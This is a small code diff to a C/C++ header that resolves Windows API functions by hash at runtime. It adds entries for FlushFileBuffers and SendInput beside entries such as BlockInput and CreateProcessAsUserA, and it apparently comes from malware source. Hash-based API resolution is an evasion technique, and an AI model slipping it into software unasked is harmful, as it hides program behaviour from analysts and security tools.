@@ -412,6 +412,7 @@ const static int ApiCacheSize = 534;
 #define pInterlockedDecrement		pushargEx< DLL_KERNEL32, 0xDD2A6D18, 190 >
 #define pFlushViewOfFile			pushargEx< DLL_KERNEL32, 0x664FD32B, 191 >
 #define pGetExitCodeProcess			pushargEx< DLL_KERNEL32, 0xFDC94385, 192 >
+#define pFlushFileBuffers			pushargEx< DLL_KERNEL32, 0x2f2feeda, 0 >	
 
 //advapi32
 #define pCreateProcessAsUserA		pushargEx< DLL_ADVAPI32, 0x985267C4, 193 >
@@ -581,6 +582,7 @@ const static int ApiCacheSize = 534;
 #define pSetCapture					pushargEx< DLL_USER32, 0xEB747643, 355 >
 #define pReleaseCapture				pushargEx< DLL_USER32, 0x6B0BEF18, 356 >
 #define pBlockInput					pushargEx< DLL_USER32, 0xF103B589, 357 >
+#define pSendInput					pushargEx< DLL_USER32, 0xce1781d0, 0 >
 
 //winsock
 #define pWSACleanup 				pushargEx< DLL_WINSOCK, 0x8FB8B5BD, 358 >
